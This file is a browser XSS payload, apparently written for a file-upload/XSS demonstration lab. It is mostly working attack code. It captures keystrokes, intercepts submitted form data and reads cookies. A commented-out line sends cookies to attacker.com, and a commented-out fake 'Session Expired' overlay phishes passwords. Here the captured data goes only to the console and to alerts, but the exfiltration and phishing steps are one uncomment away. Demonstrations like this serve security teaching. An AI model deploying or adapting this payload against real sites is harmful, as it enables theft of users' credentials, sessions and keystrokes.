// Browser-compatible XSS payload for demonstration
// This will execute in the browser when loaded via <script> tag

(function() {
  'use strict';
  
  console.log('[XSS PAYLOAD] Malicious script loaded and executing!');
  
  // Show alert to prove execution
  alert('🎯 XSS SUCCESS! Malicious script from /uploads/browser-shell.js has been executed!\n\nThis demonstrates how an attacker can:\n1. Upload malicious JS file\n2. Reference it via XSS\n3. Execute it in victim\'s browser');
  
  // Steal cookies
  if (document.cookie) {
    console.log('[XSS PAYLOAD] Cookies:', document.cookie);
    // In real attack, send to attacker server:
    // fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
  }
  
  // Log current page info
  console.log('[XSS PAYLOAD] Current URL:', window.location.href);
  console.log('[XSS PAYLOAD] Page Title:', document.title);
  
  // Keylogger (demonstration)
  let keystrokes = '';
  document.addEventListener('keypress', function(e) {
    keystrokes += e.key;
    console.log('[XSS PAYLOAD] Key pressed:', e.key);
  });
  
  // Form interceptor
  document.querySelectorAll('form').forEach(function(form) {
    form.addEventListener('submit', function(e) {
      const formData = new FormData(form);
      const data = {};
      for (let [key, value] of formData.entries()) {
        data[key] = value;
      }
      console.log('[XSS PAYLOAD] Form submitted:', data);
      alert('⚠️ Form data intercepted: ' + JSON.stringify(data));
    });
  });
  
  // Create fake login overlay (demonstration - commented out)
  /*
  const overlay = document.createElement('div');
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';
  overlay.innerHTML = `
    <div style="background:white;padding:30px;border-radius:10px;max-width:400px;">
      <h2 style="color:red;">⚠️ Session Expired</h2>
      <p>Please login again to continue</p>
      <input type="password" id="phish-pwd" placeholder="Password" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;">
      <button onclick="alert('Password captured: ' + document.getElementById('phish-pwd').value)" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;">
        Login
      </button>
    </div>
  `;
  document.body.appendChild(overlay);
  */
  
  console.log('[XSS PAYLOAD] Payload initialized successfully!');
})();
